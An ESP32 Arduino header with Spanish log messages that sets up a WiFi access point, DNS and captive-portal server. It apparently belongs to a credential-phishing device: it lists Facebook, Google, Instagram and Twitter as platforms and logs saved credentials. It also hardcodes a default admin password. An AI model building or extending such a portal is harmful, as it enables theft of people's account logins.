#ifndef INCLUDE_H
#define INCLUDE_H

#include <Arduino.h>
#include <FS.h>
#include <SD_MMC.h>
#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiSTA.h>
#include <NetworkClient.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <UrlEncode.h>
#include <base64.h>
#include <String>
//#include <HTTPRequest.hpp>
//#include <HTTPResponse.hpp>
//#include <memory>


typedef enum
{
    ADMINPAGE = 'A',
    DATAFILE  = 'D',
    EXITPAGE  = 'E',
    INDEXPAGE = 'I'
    //LOGFILE   = 'l',
}FileType_t;


typedef enum
{
    FACEBOOK  = 'F',
    GOOGLE    = 'G',
    INSTAGRAM = 'I',
    TWITTER   = 'T'
} Platform_t;


typedef struct Placeholder_t
{
public:
    static inline const String FileName        = "!{FILE_NAME}";
    static inline const String FilePath        = "!{FILE_PATH}";
    static inline const String AccessPointSSID = "!{AP_SSID}";
    static inline const String WifiSSID        = "!{WIFI_SSID}";
    static inline const String WifiStatus      = "!{WIFI_STATUS}";
    static inline const String HostsConected   = "!{TOTAL_HOST}";
    static inline const String ServerIP        = "!{SERV_IP}";
    static inline const String ClientIP        = "!{CLIENT_IP}";
    static inline const String ServerMAC       = "!{SERV_MAC}";
};


static String getCurrentTime()
{
    unsigned long runMillis= millis();
    unsigned long allSeconds= runMillis/1000;
    int secsRemaining= allSeconds%3600;

    uint8_t hours   = allSeconds/3600;
    uint8_t minutes = secsRemaining/60;
    uint8_t seconds = secsRemaining%60;

    return String(hours) + ":" + String(minutes) + ":" + String(seconds);
}


#ifndef USE_GLOBAL_VAL
#define USE_GLOBAL_VAL true
#endif

#if (USE_GLOBAL_VAL)

    #define TIME_OUT_LIMIT 20000
    #define MAX_LOGIN_TIME 150000
    #define LOGIN_LOCKOUT_TIME 300000

    #ifndef MAX_LOGIN_ATTEMPTS
    #define MAX_LOGIN_ATTEMPTS 4
    #endif

    #ifndef LOG_FILE
    #define LOG_FILE "/logs/logs.yaml"
    #endif

    #ifndef JSON_FILE_PATH
    #define JSON_FILE_PATH "/webpages/admin-login/filesdata.json"
    #endif

    #if !defined(ADMIN_USERNAME) && !defined(ADMIN_PASSWORD)
    #define ADMIN_USERNAME "admin"
    #define ADMIN_PASSWORD "@dmIn129"
    #endif

    #ifndef DNS_PORT
    #define DNS_PORT 53
    #endif

    #ifndef SERVER_PORT
    #define SERVER_PORT 80
    #endif

    #if !defined(SD_MMC_CMD) && !defined(SD_MMC_CLK) && !defined(SD_MMC_D0)
    #define SD_MMC_CMD 15
    #define SD_MMC_CLK 14
    #define SD_MMC_D0 2
    #endif

    #ifndef WITH_ERROR_TYPE
    #define WITH_ERROR_TYPE true
    #endif

    #ifndef WITH_SUCCESS_MESSAGE
    #define WITH_SUCCESS_MESSAGE true
    #endif

    #if (WITH_ERROR_TYPE)
        #define ERROR_SD_NOT_INIT  "[ERROR] La tarjeta SD no ha sido inicializada"
        #define ERROR_SD_CARD_TYPE "[ERROR] El tipo de tarjeta SD es incompatible"
        #define ERROR_SD_CARD_READ "[ERROR] error en la lectura de la tarjeta"
        #define ERROR_FILE_OPEN "[ERROR] Error al abrir el archivo: %s\n"
        #define ERROR_NO_FILE "[ERROR] El archivo %s no existe\n"
        #define ERROR_FILE_WRITE "[ERROR] Error al escribir en el archivo: %s\n"
        #define ERROR_FILE_RENAME "[ERROR] Error al renombrar archivo/carpeta: %s\n"
        #define ERROR_FILE_TYPE "[ERROR] Error de tipo de archivo/carpeta: %s\n"
        #define ERROR_FILE_DELETE "[ERROR] Error al borrar el archivo: %s\n"
        #define ERROR_DIR_CREATE "[ERROR] Error al crear la carpeta: %s\n"
        #define ERROR_DIR_DELETE "[ERROR] Error al borrar la carpeta: %s\n"
        #define ERROR_WIFIAP_CREATE "[ERROR] La creación del punto de acceso ha fallado"
        #define ERROR_WIFI_CONNECT "[ERROR] No se pudo conectar a la red wifi %s\n"
        #define ERROR_SAVE_CREDENTIALS "[ERROR] Error al guardar las credenciales"
        #define ERROR_GENERATE_JSON "[ERROR] Error al crear el fichero JSON"
        #define ERROR_SERVER_IMAGE "[ERROR] Respuesta del servidor erronea"
    #endif

    #if (WITH_SUCCESS_MESSAGE)
        #define SUCCESS_SD_INIT "[SUCCESS] Tarjeta SD inicializada correctamente"
        #define SUCCESS_FILE_OPEN "[SUCCESS] El archivo: %s se ha leído correctamente. Tiempo: %dms\n"
        #define SUCCESS_FILE_WRITE "[SUCCESS] El archivo: %s se ha guardado correctamente. Tiempo: %dms\n"
        #define SUCCESS_FILE_RENAME "[SUCCESS] El archivo: %s se ha renombrado correctamente\n"
        #define SUCCESS_FILE_DELETE "[SUCCESS] El archivo: %s se ha borrado correctamente\n"
        #define SUCCESS_DIR_CREATE "[SUCCESS] La carpeta: %s se ha creado correctamente\n"
        #define SUCCESS_DIR_DELETE "[SUCCESS] La carpeta: %s se ha borrado correctamente\n"
        #define SUCCESS_WIFIAP_INIT "[SUCCESS] Punto de acceso iniciado correctamente"
        #define SUCCESS_WIFISTA_CONECT "[SUCCESS] Se ha conectado correctamente a la red: %s\n"
        #define SUCCESS_SERVER_INIT "[SUCCESS] Servidor iniciado correctamente"
        #define SUCCESS_APSERVER_INIT "[SUCCESS] El servidor del punto de acceso cautivo iniciado correctamente"
        #define SUCCESS_LOG_EVENT "[LOGS] Evento guardado correctamente"
        #define SUCCESS_SAVE_CREDENTIALS "[SUCCESS] Credenciales enviadas y guardadas correctamente"
        #define SUCCESS_GENERATE_JSON "[SUCCESS] El archivo JSON se generó correctamente"
        //#define SUCCESS_SD_CARD_TYPE "[SUCCESS] El tipo de tarjeta es incompatible"
        //#define SUCCESS_SD_CARD_READ "[SUCCESS] en la lectura de la tarjeta"
    #endif

#endif //USE_GLOBAL_VAR



#endif //INCLUDE_H